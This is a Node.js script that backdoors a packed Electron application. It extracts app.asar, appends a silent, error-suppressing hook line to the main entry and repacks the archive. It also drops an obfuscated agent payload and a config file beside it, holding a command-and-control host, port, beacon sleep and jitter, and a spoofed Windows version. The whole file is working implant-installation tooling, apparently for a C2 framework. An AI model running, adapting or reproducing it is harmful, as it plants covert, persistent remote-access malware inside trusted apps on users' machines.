#!/usr/bin/env node
// inject_asar.js — script-jack a PACKED Electron app (resources/app.asar).
// Handles packed (app.asar) Electron targets.
//
// Layout decision: everything dynamic lives OUTSIDE the archive —
//
//   resources/
//     app.asar              <- repacked: main entry gets ONE hook line
//     app.asar.orig         <- pristine backup of the original archive
//     adpt.payload.js       <- the agent bundle (updatable without repacking)
//     adpt.config.json      <- sidecar config (session key persists HERE)
//
// Why outside? Electron's asar fs is READ-ONLY: persistSessionKey() could not
// write the sticky session key inside the archive, and payload updates would
// need a full repack. The hook line inside the archive is marker-guarded and
// wrapped in try/catch (fail-silent injection contract).
//
// Usage:
//   node scripts/inject_asar.js [--app <dir|asar>] [--id cafe0011] [--host H]
//        [--port N] [--ssl] [--os win11] [--debug] [--plain] [--clean]
//   --app resolves: an app.asar path, or a dir containing resources/app.asar
const fs = require('fs');
const path = require('path');
const os = require('os');
const { readArchive, walk, extract } = require('./asar');

function arg(name, dflt) {
  const i = process.argv.indexOf('--' + name);
  return i >= 0 && process.argv[i + 1] ? process.argv[i + 1] : dflt;
}
const has = (name) => process.argv.includes('--' + name);

function die(msg) { console.error('[inject-asar] ' + msg); process.exit(1); }

const MARKER = '/*@@adpt*/';
// Payload path derives from __dirname (the main entry's dir INSIDE the
// archive), NOT process.resourcesPath: in dev mode (electron cli) resourcesPath
// points at the Electron binary's own Resources, not our app dir. The injector
// computes the right number of '..' hops from the entry depth.
const hookLineFor = (entryDepth) => {
  const hops = Array(entryDepth).fill("'..'").join(', ');
  return `try { require(require('path').join(__dirname, ${hops}, 'adpt.payload.js')); } catch (_) {}`;
};

// ---- resolve the archive ---------------------------------------------------
function resolveAsar(a) {
  if (!a) { console.error('usage: inject_asar.js --app <path/to/app.asar> ...'); process.exit(1); }
  if (a.endsWith('.asar') && fs.existsSync(a)) return path.resolve(a);
  const candidates = [
    path.join(a, 'resources', 'app.asar'),
    path.join(a, 'app.asar'),
  ];
  for (const c of candidates) if (fs.existsSync(c)) return c;
  die(`no app.asar found for --app ${a}`);
}

const asarPath = resolveAsar(arg('app', null));
const resourcesDir = path.dirname(asarPath);
const origPath = asarPath + '.orig';
const payloadPath = path.join(resourcesDir, 'adpt.payload.js');
const sidecarPath = path.join(resourcesDir, 'adpt.config.json');

// ---- clean -----------------------------------------------------------------
if (has('clean')) {
  let n = 0;
  if (fs.existsSync(origPath)) { fs.copyFileSync(origPath, asarPath); fs.unlinkSync(origPath); n++; console.log('[inject-asar] restored ' + path.basename(asarPath) + ' from .orig'); }
  for (const p of [payloadPath, sidecarPath]) if (fs.existsSync(p)) { fs.unlinkSync(p); n++; }
  console.log(`[inject-asar] clean: removed/restored ${n} artifact(s) around ${asarPath}`);
  process.exit(0);
}

// ---- inject ----------------------------------------------------------------
if (!fs.existsSync(origPath)) { console.log('[inject-asar] backing up original -> ' + path.basename(origPath)); fs.copyFileSync(asarPath, origPath); }

// 1) payload outside the asar (updatable, writable sidecar)
const srcPayload = has('plain')
  ? path.join(__dirname, '..', 'dist', 'adaptix.payload.js')
  : path.join(__dirname, '..', 'dist', 'adaptix.payload.obf.js');
if (!fs.existsSync(srcPayload)) die('payload not built yet: ' + srcPayload + '\n  -> run: npm run build');
fs.copyFileSync(srcPayload, payloadPath);

// 2) sidecar next to the payload (merge preserves the sticky session key)
const generated = {
  debug: has('debug'),
  agent_id: arg('id', 'cafe0011'),
  host: arg('host', '127.0.0.1'),
  port: parseInt(arg('port', '8443'), 10),
  ssl: arg('ssl', '0') === '1',
  sleep_delay: parseInt(arg('sleep', '5'), 10),
  jitter_delay: parseInt(arg('jitter', '15'), 10),
};
const osArg = arg('os', null);
if (osArg) {
  const map = { win7: [6, 1, 7601], win10: [10, 0, 19045], win11: [10, 0, 22631], win2022: [10, 0, 20348] };
  const v = map[String(osArg).toLowerCase()];
  if (v) generated.os_spoof = { major: v[0], minor: v[1], build: v[2] };
}
let finalSidecar = generated;
try {
  if (fs.existsSync(sidecarPath)) {
    const prev = JSON.parse(fs.readFileSync(sidecarPath, 'utf8'));
    if (String(prev.agent_id) !== String(generated.agent_id)) delete prev.session_key; // new id => fresh key
    finalSidecar = { ...prev, ...generated };
  }
} catch (_) { /* corrupt prev -> fresh sidecar */ }
fs.writeFileSync(sidecarPath, JSON.stringify(finalSidecar, null, 2) + '\n');

// 3) patch the main entry inside the archive and repack
const arch = readArchive(asarPath);
const pkgEntry = arch.header.files['package.json'];
if (!pkgEntry) die('app.asar has no package.json at its root — unexpected layout');
const pkg = JSON.parse(readFileBytesSafe(asarPath, arch, pkgEntry).toString('utf8'));
let mainRel = String(pkg.main || 'index.js').replace(/^\.\//, '');
let mainNode = arch.header.files;
const mainParts = mainRel.split('/');
let found = true;
for (let i = 0; i < mainParts.length; i++) {
  if (!mainNode[mainParts[i]]) { found = false; break; }
  if (i < mainParts.length - 1) mainNode = mainNode[mainParts[i]].files;
  else mainNode = mainNode[mainParts[i]];
}
if (!found || mainNode.offset === undefined) die(`main entry '${mainRel}' not found in the asar index`);

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'adpt-asar-'));
let patched = false;
try {
  extract(asarPath, tmp);
  const mainAbs = path.join(tmp, mainRel);
  let src = fs.readFileSync(mainAbs, 'utf8');
  if (src.includes(MARKER)) {
    if (src.includes('adpt.payload.js')) {
      console.log('[inject-asar] main entry already hooked — payload/config refreshed only');
    } else {
      src = src.replace(MARKER, `${MARKER}\n${hookLineFor(mainParts.length)}`);
      fs.writeFileSync(mainAbs, src);
      patched = true;
    }
  } else {
    src = src.replace(/\s*$/, '') + `\n${MARKER}\n${hookLineFor(mainParts.length)}\n`;
    fs.writeFileSync(mainAbs, src);
    patched = true;
  }
  // repack the WHOLE archive (correctness over in-place patching; a real app
  // extracts in seconds and keeps the format exactly Electron-shaped)
  const { pack, writeArchive } = require('./asar');
  const packed = pack(tmp, { integrity: true });
  writeArchive(asarPath, packed);
} finally {
  fs.rmSync(tmp, { recursive: true, force: true });
}

console.log(`[inject-asar] archive : ${asarPath}${patched ? ' (main patched + repacked)' : ''}`);
console.log(`[inject-asar] payload : ${path.basename(srcPayload)} -> ${payloadPath}`);
console.log(`[inject-asar] sidecar : agent_id=${finalSidecar.agent_id} -> ${finalSidecar.ssl ? 'https' : 'http'}://${finalSidecar.host}:${finalSidecar.port} debug=${finalSidecar.debug}`);
console.log(`[inject-asar] run it  : npx electron ${asarPath}`);

function readFileBytesSafe(p, a, e) {
  return require('./asar').readFileBytes(p, a, e);
}
